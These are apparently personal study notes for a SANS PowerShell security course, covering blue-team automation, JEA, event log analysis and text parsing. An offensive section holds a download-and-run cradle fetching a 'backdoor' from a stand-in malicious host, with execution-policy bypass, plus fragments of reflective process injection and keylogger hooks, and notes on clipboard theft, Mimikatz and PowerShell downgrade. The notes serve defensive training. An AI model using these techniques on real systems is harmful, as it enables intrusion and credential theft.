	 - `Invoke-RestMethod -Uri $uri -Authentication OAuth -Token (Get-Content -  Path C:\oAuthToken.txt)`

### TLS Protocol Versions
Book2:Page135

### Self-Signed Certificates
Book2:Page136

## Notifications
#Send-mailmessage 
 - `Send-MailMessage` is a full-featured mail client  
 - Can be used by blue teams to send reports, alerts, etc.  
 - Supports any SMTP-enabled mail server (Gmail, O365, Exchange, etc.
```Powershell
Send-MailMessage -From 'handler <ih@domain.com>' –To ‘Ticketing <incidents@domain.com>’, ‘Manager <leadhandler@domain.com>' -Subject 'Credential theft' -Body 'Automated alert from host $hostname’ -Attachments $attachmentPath -SmtpServer 'mail.domain.com'
```
### Emails: Office 365
Book2:Page140
 - SMTP authentication is disabled with Security Defaults in O365
 - Modern Auth is the preferred method of authentication  
 - Azure AD App Registration required  
 - Certificate or ClientID/Secret available for authentication  
 - Mail.Send Permission assigned  
 - User:sendMail action can be accomplished with Send-MgUserMail  
 - See Notes for more details
## Custom PowerShell Modules
Book2:Page141

## Raw TCP/UDP connections
Book2:Page141 
# 2.5 Interactive NoteBooks
## Jupyter Setup
#jupyter
 - Python/Pip  
 - Jupyter/Jupyter Lab  
 - .NET Core SDK  
 - .NET Interactive  
 - PowerShell 7+ 
 - Then:
	 - *Make shortcut that executes `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe jupyter notebook`*
	 - *change properties to "Start in:" you designated jupyter location (e.g `c:\users\student\Jupyter`)*
	 - *Then run `dotnet interactive jupyter install`*
Guide: https://www.how2shout.com/how-to/how-to-install-jupyter-notebook-in-windows-11-or-10-using-cmd.html
## Notebook Kernels
#kernals
Jupyter documentation often uses the name ‘kernel’ when discussing language processing. The kernel is the utility that interprets code within code cells, evaluates, and executes it, and returns output to the frontend  client.

 - (Jupyter) Register .NET interactive kernel with:  `dotnet interactive jupyter install`  
 - (Jupyter) List installed kernels:  `jupyter kernelspec list`

## Notebook Cells
Book2:Page151

## Variable Scope inside of Notebooks
Book2:Page154

## Notebook Example's
### Initial Triage
Book2:Page155
![[Pasted image 20230530122555.png]]
![[Pasted image 20230530122619.png]]

### Hunt campaigns
Book2:Page158
![[Pasted image 20230530122940.png]]
![[Pasted image 20230530123045.png]]
![[Pasted image 20230530123052.png]]
# 3.1 Offensive Powershell
## PowerShell as a Downloader
Book3:Page9
#invoke-webrequest 
#webclient
 - `Invoke-WebRequest` or `System.Net.WebClient` act as downloader
 - Wrap in `Invoke-Expression` (`iex` alias) for automatic execution
```Command
powershell.exe -ep Bypass -nop -noexit -c iex ((New Object
System.Net.WebClient).DownloadString(‘https://some-malicious-
site.com/backdoor′))
```

## Detection
### Initial Access and Execution
Book3:Page11
 - Traditional defenses can also be used  
• Sysmon/Windows Event ID 4688 can identify parent/child relationships  
• Parent process of WMI, Office, etc.  
• Child Process of script execution  
• See Sigma rules in notes  
• Network-based Egress Filtering  
• Look for abnormal HTTP headers (PowerShell User Agent or no User Agent, i.e.,  
WebClient)  
• Web Proxy should have default deny policy to block access to non-permitted sites

### Command and Control
Book3:Page13
Monitor:
 - Abnormal execution  
• PowerShell invocation and monitoring can still be useful in this phase  
• Violation of Egress Filtering controls  
• Proxies should terminate and inspect encrypted traffic to ensure visibility  
• Techniques like Domain Fronting/Domain Hiding require deep inspection  
• Anomalous outbound activity  
• Monitor for Beaconing, regular outbound connections  
• SIEM and Network Security Monitoring tools provide excellent visibility  
• Use statistical analysis to find beacons

### Powershell Persistence
• Services, Scheduled Tasks, Registry Run keys, and more  
• Native PowerShell persistence often achieved via $PROFILE  
• MITRE ATT&CK Technique T1546.013  
• Multiple $PROFILE locations to embed malicious code or downloader  
• Can also be used for privilege escalation if $PROFILE is executed by  
higher-privileged process  
• Prevention: Sign $PROFILE scripts and enforce execution policy  
• Detection: Monitor $PROFILE for malicious entries

## Process Injection
Book3:Page15 
Running new process requires malicious code to exist on disk  
• Instead, run malicious code inside benign process to make detection harder  
• Generally, leverages Windows APIs to manipulate process memory  
• VirtualAlloc() reserves space for malicious code  
• WriteProcessMemory() writes malicious code to reserved space  
• CreateProcessThread() executes malicious binary  
• Several function variations and techniques exist to evade detection  
• PowerShell’s .NET integration makes this straightforward to  
execute within a Powershell session

### Interacting with Windows APIs
Three main techniques  
1. Add-Type to compile C# implementing Windows APIs  
• Documented method but results in files written to disk for compilation  
2. Leveraging available .NET classes’ ability to interact with Windows APIs  
• Involves enumerating/using classes via local AppDomain as covered in 586.1  
3. Leveraging reflection to add custom assembly to AppDomain  
• Useful when AppDomain does not already contain class to interact with Windows APIs  
• Keeps assembly in memory with:  
```Powershell
$Assembly = New-Object System.Reflection.AssemblyName(‘assembly’)  
[AppDomain]::CurrentDomain.DefineDynamicAssembly($Assembly,  
[Reflection.Emit.AssemblyBuilderAccess]::run
```

### Process Injection Example
PowerSploit's "`invoke-reflectivePEInjection`"

```Powershell
function Invoke-ReflectivePEInjection  
{  
...  
$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle,  
[IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor  
$Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)  
...  
$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle,  
$RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)  
...  
$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle,  
0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0,  
0xffff, 0xffff, [IntPtr]::Zero)  
}
```
## OS Credential Dumping: Invoke-Mimikatz.ps1
#mimikatz
 - One technique – inject into LSASS process memory and profit  
• Reflective injection of Mimikatz DLL permits access to secrets  
• Similar techniques as shown in Invoke-ReflectivePEInjection  
• Minimizes visibility to tools like Sysmon and EDR tools  
• DLL to inject is encoded Base64 byte array inside script  
• Embedded code leverages several novel techniques to access credentials  
• Additional native DLLs loaded to provide full functionality  
• Heavy obfuscation allows for evading AV/EDR
## KeyLogging
#keylogging
#GetAsyncKeyState
```Powershell
$Hook = $SetWindowsHookEx.Invoke(0xD, $Callback, $ModuleHandle, 0)  
$CallbackScript = {  
##  
$vKey = [Windows.Forms.Keys][Runtime.InteropServices.Marshal]::ReadInt32($lParam)  
##  
return $CallNextHookEx.Invoke([IntPtr]::Zero, $Code, $wParam, $lParam)  
##  
$UnhookWindowsHookEx.Invoke($hook)
```
![[Pasted image 20230530150320.png]]

## Clipboard Access
 - Instead, users may copy/paste privileged account passwords  
• `Get-Clipboard` returns clipboard contents  
• Can simply run inside infinite loop to steal anything copied  
• Inguardians `Invoke-Clipboard.ps1` script pulls clipboard  
contents  
	• And has built-in command and control capabilities  
	• Add-Type enables user32.dll functions with custom namespace/class  
name  
	• `[AtomMe.pwnsauce]::GetClipboardData($codetextUNI)`

## Ransomware
Book3:Page24
FTCode Ransomware popularized Powershell-based ransomware
• Fileless attack leveraging Macro for initial delivery  
• Command and control for key exchange  
• Rijndael  (symmetric) algorithm  
used for encryption

## Offensive Powershell overview
Book3:Page27
 - Natively available on many target systems  
• Fileless malware capabilities  
• Extensible with .NET  
• Add-Type allows for loading of additional libraries  
	• Win32 APIs enable deeply integrated capabilities  
		• Process Injection  
		• Hooking keyboard functionality  
• Result: Capabilities across entire Enterprise ATT&CK Matrix
# 3.2 Controlling Powershell
## Blocking Powershell
This does not provide comprehensive protection  
• Several bypass mechanisms exist  
• Depending on the implementation, it may break IT scripts/applications  
• To more effectively block (not for SEC586 students and not foolproof),  leverage Application Control suite to block  **System.Management.Automation.dll**  
• Don’t block; control PowerShell execution  
• Enable automation with appropriate restrictions  
• Detect and respond to misuse
NOTE: this does not stop the “Bring your own DLL” approach similar to the common bypass of blocking  powershell.exe. An attacker may bring their own version of this DLL to execute it and bypass the Deny List

## Controlling Powershell (other) 

### Versions
#powershell2
**Powershell Downgrade attack:**
 - PowerShell 2.0 may still be installed and can be used with:  
```Powershell
powershell -version 2  
$PSVersionTable.PSVersion.Major  2
```
**Mitigate this with**:
• Check to see if it is enabled with:  
```Powershell
Get-WindowsOptionalFeature -Online | Where-Object  {$_.FeatureName -like "*PowerShellV2*"}  
```
• Disable version 2:  
```Powershell
Disable-WindowsOptionalFeature -Online -FeatureName  MicrosoftWindowsPowerShellV2Root
```

### Antimalware Scan Interface (AMSI)
#AMSI
 - Windows APIs to mitigate deficiencies in signature-based detection  
• PowerShell leverages AMSI to look for malicious execution  
• AMSI.dll loaded into PowerShell processes to interrogate execution  
• Allows passing deobfuscated code to AMSI APIs  
• Regardless of obfuscation technique, code that is actually executing will be  
tested  
• Several bypasses exist, although protection can mitigate attacks  
• AMSI can be disabled with registry key, AMSI API call, and more  
• Continued research allows tampering detection as bypasses are discovered
### Execution policy
 - Restricted – Only individual commands can be run; scripts are blocked  
• Default execution policy on Windows 10  
• AllSigned  
• Only signed scripts can run; untrusted publishers will generate warnings  
• RemoteSigned – Scripts from the internet must be signed  
• Default on Windows Server OS  
• Bypass – Allows all PowerShell scripts regardless of signing; no warnings  
• Unrestricted – Unsigned scripts can be run; warns about remote scripts  
• Only option on non

#### Bypasses
 - Copy/Paste script into the console  
 - PowerShell invocation can override default Execution Policy  
```Powershell
Get-ExecutionPolicy  RemoteSigned  
pwsh -ExecutionPolicy Bypass  
Get-ExecutionPolicy  Bypass
```
### Language modes
#FullLanguage
#ConstrainedLanguage
#RestrictedLanguage
#NoLanguage
 - FullLanguage  
	 - Allows all PowerShell functionality within a session  
 - **ConstrainedLanguage**  
	 - Significant language restrictions including .NET types that can be used  
	 - May cause usability issues, but offers **significant protection**  
 - RestrictedLanguage  
	 - Commands only; no variables, scriptblocks, etc.  
 - NoLanguage  
	 - No functionality; used by Just Enough Administration
**Recomendations**:
 - Set the language mode via Session Configuration  
	 - LanguageMode keyword  
OR
 - Set ConstrainedLanguage Mode via User Mode Code Integrity tool

```Powershell
$ExecutionContext.SessionState.LanguageMode
#FullLanguage

$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"

$ExecutionContext.SessionState.LanguageMode
#ConstrainedLanguage
```
### Application Control Integration
Book3:Page38

### Dealing with Credentials
Book3:Page39
### SecureString and PSCredential Objects
Book3:Page40
#AsSecurestring 
#converto-securestring
Read-Host can read user input directly into a SecureString object  
```Powershell
$readPass = Read-Host -Prompt "Enter Password“ -AsSecureString  
```
• Variables can be converted to SecureStrings  
```Powershell
$mySecret = "SuperSecretPassword“  

$mySecureString = $mySecret | ConvertTo-SecureString - AsPlainText -Force  
```
• PSCredential accepted by cmdlets with -Credential parameter  
	• Requires SecureString passed as password  
```powershell
$credential = New-Object -TypeName System.Management.Automation.PSCredential ('administrator',$mySecureString)
```


### Protecting Plaintext Strings in Memory
Book3:Page41
![[Pasted image 20230531121239.png]]
### Saving SecureString Objects
#export-clixml
#import-clixml
Book3:page42
![[Pasted image 20230531121515.png]]
### Secrets Management
#set-secret
#get-secret
#get-secretvault
Book3:Page43
**Basically a password vault built into powershell**
 - Microsoft.PowerShell.SecretManagement module
```Powershell
Set-Secret -Name apiKey -Secret 'abcd’

Get-Secret -Name apiKey
#System.Security.SecureString

Get-Secret -Name apiKey | ConvertFrom-SecureString -AsPlainText
#abcd
```
## Controlling Powershell (JEA)
#JEA
Book3:Page45
• Does a user need to be an administrator for that one task?  
• JEA allows for enabling exactly what is needed, and nothing more  
• Extension of Constrained Endpoints in remoting  
• Defined via custom Session Configurations and Role Capabilities  
**• Role Capabilities file (.psrc file) defines actions that can be performed  
• Session Configuration file (.pssc file) defines session characteristics**
### Role Capabilities
Book3:Page46
#new-psrolecapabilityfile

 - What cmdlets can be run  
	• And which parameters/values can be provided to those cmdlets  
• What modules can be loaded  
• What external/native commands can be run  
• What providers can be accessed (e.g., FileSystem, Registry, etc.)  
• `New-PSRoleCapabilityFile` cmdlet creates configuration file  
	• Parameters will pre-configure the file  
	• File should be put in ‘RoleCapabilities’ folder in protected location

Example
The configuration  snippet below shows an example of this, allowing the user to restart the AppIDSvc service only:
```Powershell
VisibleCmdlets = @{ Name = 'Restart- Service'; Parameters = @{ Name = 'Name'; ValidateSet = 'AppIDSvc' }}
```

### Creating a Roles Capability Definition
Book3:Page48
1. Create hash table containing role capabilities in .psrc file
```Powershell
New-PSRoleCapabilityFile -Path 'C:\Program Files\PowerShell\Modules\JEA\BlueTeam.psrc’
```
2. Edit role capabilities
```Powershell
code 'C:\Program Files\PowerShell\Modules\JEA\BlueTeam.psrc’
```
*insert the below configuration example*
![[Pasted image 20230531123302.png]]

### Session Configurations
#New-pssessionconfigurationfile 
 - Role Definitions – maps users to JEA roles  
• Run as virtual account – Specify more permissions (e.g., admin)  
• Can also run as Group Managed Service Account (GMSA)  
• Session Type (Should be RestrictedRemoteServer)  
• Forces NoLanguage mode  
• Transcript location for logging sessions  
• Create session configuration with `New-PSSessionConfigurationFile`

### Creating a Session Configuration File
1. Create hash table defining session configuration
```Powershell
New-PSSessionConfigurationFile -Path 'C:\Program  
Files\PowerShell\Modules\JEA\blueteam.pssc’
```
2. Edit the configuration details
```Powershell
code 'c:\program files\powershell\Modules\JEA\blueteam.pssc'
```
3. Enter some code like this:
```powershell  
@{  
SchemaVersion = '2.0.0.0'  
GUID = 'a3117078-0af4-4d1e-9ee8-a035a761b8b9'  
Author = 'jj'  
SessionType = 'RestrictedRemoteServer'  
TranscriptDirectory = 'C:\Audit\PSTranscripts\'  
RunAsVirtualAccount = $true  
RoleDefinitions = @{ 'JJ\BlueTeam' = @{ RoleCapabilityFiles = 'C:\Program  
Files\PowerShell\Modules\JEA\BlueTeam.psrc' } }  
}
```

### Registering the JEA Configuration
Registering the JEA Configuration
• PowerShell Desired State Configuration is best for standardizing JEA configurations across a fleet of systems
	• JEA DSC resource reads session/role definition from file share
	• DSC covered in SEC586.4
• On individual systems, Register-PSSessionConfiguration
cmdlet enables JEA endpoint
	• Note: WinRM will restart, so be sure to accommodate for active sessions
```Powershell
Register-PSSessionConfiguration -Name BlueTeam -Path 'C:\Program
Files\PowerShell\Modules\JEA\blueteam.pssc'
```
### Verifying JEA
1. Use session config file to login with
```Powershell
PS C:\> Enter-PSSession -ComputerName localhost -ConfigurationName Blueteam
```
2. use `get-command` to find out what is available with this config file

```Powershell
get-command 
#this will list off what commands are available witht eh 'Blueteam' session config file
```



# 3.3 Log Analysis
## Powershell Log Types
#operational
#Module
#Transcript
#scriptblock
Post Powershell v5
![[Pasted image 20230531131038.png]]
Links:
 - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_eventlogs?view=powershell-5.1  
 - https://www.cyber.gov.au/publications/securing-powershell-in-the-enterprise  
 - https://docs.microsoft.com/en-us/powershell/scripting/windows-powershell/wmf/whats-new/script-logging?view=powershell-7  
 - https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/5760096ecf80a129e0b17634/1465911664070/Windows+PowerShell+Logging+Cheat+Sheet+ver+June+2016+v2.pdf  
 - https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html  
 - 
 - https://www.blackhillsinfosec.com/powershell-logging-blue-team


## Module Logging 
Book3:Page65
![[Pasted image 20230531131925.png]]
## Script Block Logging
Book3:Page66
![[Pasted image 20230531131952.png]]

## Get-winevent
#get-winevent
Book3:Page70

 - List all logs with `Get-WinEvent –ListLog *`

### Filtering parameters
 - `-Filterhashtable` (hash table defines query)
`Get-WinEvent -FilterHashtable @{Logname="Security";ID=4624}`  
 - `-FilterXML `(XML-Translated version of FilterHashTable)  
```Powershell
Get-WinEvent -FilterXml '<QueryList><Query Id="0" Path="Security"><Select Path="Security"> *[EventData[(Data[@Name="SubjectUserName"] = "jj") or  (Data[@Name="TargetUserName"] = "jj")]]</Select></Query></QueryList>’  
```
 - `-FilterXPath` (Accepts XPath query to filter logs)  
```powershell
Get-WinEvent -FilterXPath -LogName Security '*[EventData[(Data[@Name="SubjectUserName"] = "jj") or (Data[@Name="TargetUserName"] = "jj")]]
```

### Converting Events to XML
#xml
#toxml 

Rather than parsing this property, the event can be converted to  
XML for easier analysis  
• Cast object as `[XML]` data type  
• Leverage the` .ToXml()` .NET method on the Windows Event(s)  
• Resulting object’s` Event.EventData.Data` property contains XML  elements  
```Powershell
$processExecution = Get-WinEvent -FilterHashtable @{Logname="Security";Id=4688} -MaxEvents 1  

$converted4688Event = [xml]$processExecution.ToXml()
```
**Accessing XML Event Properties**

```Powershell
$converted4688Event.Event.EventData.Data

#then find number of line that you want to extract and use:

converted4688Event.Event.EventData.Data[8].'#text'  
```
![[Pasted image 20230531140244.png]]

### The .Properties Property
Book3:page77
**After converting event to XML object, shorten the process of getting that information with he .properties Property value**
![[Pasted image 20230531140808.png]]

## Detections
### Sigma
#sigma
Book3:Page79
Sigmac convert syntax:
```Powershell
sigmac -t powershell "C:\sigmamaster\rules\windows\powershell\powershell_classic\posh_pc_remote_powershell_session.yml"
```
The –t parameter directs sigmac to output the rule in the PowerShell format, and the .yml file containing the  detection logic is specified. The resulting query is the below:
```Powershell
Get-WinEvent | where {($_.ID -eq "400" -and $_.message -match  
"HostName.*ServerRemoteHost" -and $_.message -match  
"HostApplication.*.*wsmprovhost.exe.*") } | select  
TimeCreated,Id,RecordId,ProcessId,MachineName,Message
```
Links:
 - https://github.com/SigmaHQ/sigma  
 - https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_classic/posh_pc_remote_powershell_session.yml

### DeepBlueCLI
#deepbluecli
Book3:Page80

Link:
 - https://github.com/sans-blue-team/DeepBlueCLI#usage

## Text-Based Log Parsing
#convertfrom-string
Book3:page81
• ConvertFrom-String cmdlet converts strings to objects  
• Delimiter parameter defines how to split the string  
• PropertyNames parameter allows for naming object properties  
• Templating functionality allows providing sample data  
• PowerShell will figure out how to parse future strings into meaningful data

### ConvertFrom-String: IIS Parsing
Book3:Page82
```powershell
$iisSample | ConvertFrom-String -PropertyNames "date","time","cs-  
method","cs-uri-stem","s-port","cs-username","c-ip","cs-version","cs(User-  
Agent)","cs(Cookie)","cs(Referer)","cs-host","sc-status","sc-  
substatus","sc-win32-status","sc-bytes","cs-bytes","time-taken"
```
![[Pasted image 20230531142739.png]]

### ConvertFrom-String: Pattern Learning
Book3:Page84
```Powershell
$template = @'  
{date*:2019-03-14} {time:07:58:10} {s_ip:10.0.0.104} {method:PUT}  
{uri:/Internal/RemoteShare/ ReturnUrl=%2fConfigWeb%2fAudit.aspx}  
{port:443} {username:-} {c_ip:160.44.59.168}  
{c_useragent:Mozilla/5.0+(Windows+NT+6.1;+rv:50.0)+Gecko/20100101+Firefox/  
50.0} {c_referer:http://www.greylock.com} {s_status:304} {s_substatus:8}  
{s_win32_status:12030} {time_taken:58}  
{date*:2019-03-14} {time:08:10:41} {s_ip:10.0.0.103} {method:GET}  
{uri:/welcome.png} {querystring:v=4.5.0} {port:80} {username:-}  
{c_ip:205.168.30.201}  
{c_useragent:Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.co  
m/bot.html)}  
{c_referer:http://www.bing.com/search?q=sumo%20applications&src=IE-  
SearchBox&FORM=IE11SR} {s_status:200} {s_substatus:8}  
{s_win32_status:12030} {time_taken:6}  
‘@

$iisLogs | ConvertFrom-String -TemplateContent $template
```
![[Pasted image 20230531143020.png]]

## Creating a New Event Log
Book3:Page87-88
#new-eventlog
#write-eventlog
Make new event log
```Powershell
New-EventLog -Source "BlueTeamScripts" -LogName "BlueTeam"
```
Write event logs (allows for writing new events to a specific log)
```Powershell
  
$routes = Get-Netroute -AddressFamily IPv4 | Where-Object  
{$_.DestinationPrefix -eq "0.0.0.0/0"} | Select-Object -Property  
NextHop,InterfaceAlias,ifIndex,DestinationPrefix,InterfaceMetric  

if($routes.Count -gt 1){ Write-EventLog -LogName "BlueTeam" -  
Source "BlueTeamScripts" -EventId 11 -EntryType Warning -Message ($routes | ConvertTo-Json) }
```
# 3.4 Text parsing
## Select-string
Book3:Page96-97
#select-string
• -Pattern parameter accepts regular expressions  
	• Encapsulate fields to extract in (parentheses)  
	• Returns an object to the pipeline with a Matches property  
		• Matches property is hash table containing the extracted fields  
		• Save output to variable if needed later as property is available on the pipeline ONLY  
		• -Match operator (discussed shortly) writes objects to a global $Matches variable
Example:
```Powershell
"Failed login: User Administrator" | Select‐String ‐Pattern "Failed login: User (\w+)" | ForEach‐Object { $_.Matches[0].Groups[1].Value }
```
In this example, when the `select-string` encounters a match (in this case it was where it found a user with (\w+) ) i then can be found with ".Matches[]" because a match was found (it only works when a match is found)
![[2023-05-31 15-09-22.mkv]]

## Match Operator
Book3:Page99
#match
## Matches Variable
Book3:Page100
#matches
$matches variable is a Boolean , so you can use an if statement on it
```Powershell
"Failed login: User Administrator" -match "Failed login: User  (\w+)"  
#True
```
## Named Captures
Book3:Page101
You can specify the name when a match is made instead of relying on the number as seen before (e.g `$_.matches[username] instead of $_matches[0]` )

```Powershell
"Failed login: User Administrator" -match "Failed login: User (?<username>\w+)"
```
OUTPUT:
```Powershell
PS C:\> $Matches  
Name           Value  
----           -----  
username       Administrator  
0              Failed login: User Administrator
```
## .NET System.String Class
Book3:Page98

## String Matching with the -like Operator
Book3:Page102
 - Boolean value
 - can use wildcards
## Split Operator
Book3:page103
 - -split operator converts a single string into multiple substrings
## Switch Statement –regex Option
Book3:Page104-105
Checks multiple types of potential matches
```Powershell
$inputString = @("Failed login: User Administrator","Failed login: User Adminis  
trator","Successful login: User Administrator", "New User Created: l33th4x0r")

switch -regex ($inputString) {
	"(?<LoginType>\w+ login): User (?<Username>\w+)" {
		[PSCustomObject]@{  
			Action = $Matches['LoginType'];  
			Username = $Matches['Username']
		}
	}
	"(?<Action>New User Created): (?<Username>\w+)" {
		[PSCustomObject]@{  
			Action = $Matches['Action'];  
			Username = $Matches['Username']  
		}
	}
}

```
![[Pasted image 20230531153210.png]]
## Case Insensitivity
Book3:Page107

# 3.5 DevOps
# 4.1 System Hardening

